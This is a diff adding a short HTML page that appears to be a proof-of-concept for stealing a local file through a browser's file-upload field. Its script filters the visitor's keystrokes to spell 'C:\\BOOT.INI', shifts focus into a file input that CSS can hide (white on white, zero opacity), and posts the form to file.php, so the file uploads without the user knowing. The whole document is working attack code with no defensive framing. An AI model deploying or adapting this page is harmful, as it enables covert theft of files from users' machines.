@@ -1,0 +1,56 @@
+<HTML>
+<HEAD>
+<style type="text/css">
+.first {
+}
+.second {
+        color: white;
+        background-color: white;
+        opacity: 0;
+}
+</style>
+<SCRIPT>
+//document.onKeyDown = doKeyPress;
+
+//document.onKeyUp = doKeyUp;
+var saved;
+var e ;
+var mystring = "C:\\BOOT.INI";
+//var i=mystring.length-1;
+var i=0;
+function doKeyPress(chucky)
+    {
+    saved = chucky.which;
+    //alert('pressed ' + String.fromCharCode(saved) + '(' + saved + ')');
+    if (mystring[i] != String.fromCharCode(saved).toUpperCase() ||
+        i > mystring.length-1) {
+       return false;
+    }
+    i++;
+    return true;
+  };
+function doKeyUp () {
+
+document.forms[0].txt.value += String.fromCharCode(saved);
+document.forms[0].txt.focus();
+
+}
+
+</SCRIPT>
+</HEAD>
+<BODY >
+<FORM METHOD=POST action=file.php>
+<INPUT id='asdf' name="fileupload" defaultValue='asdfasdf' TYPE=FILE
+OnKeyUp="doKeyUp();"
+OnKeyPress="return doKeyPress(event);">
+<input name=txt id='txt' type=text value=''
+OnKeyDown="document.forms[0].fileupload.focus();"
+onClick="">
+<input type=button value="invisible"
+onclick="document.forms[0].fileupload.className='second';">
+<input type=button value="visible"
+onclick="document.forms[0].fileupload.className='first';">
+
+</FORM>
+</BODY>
+</HTML>
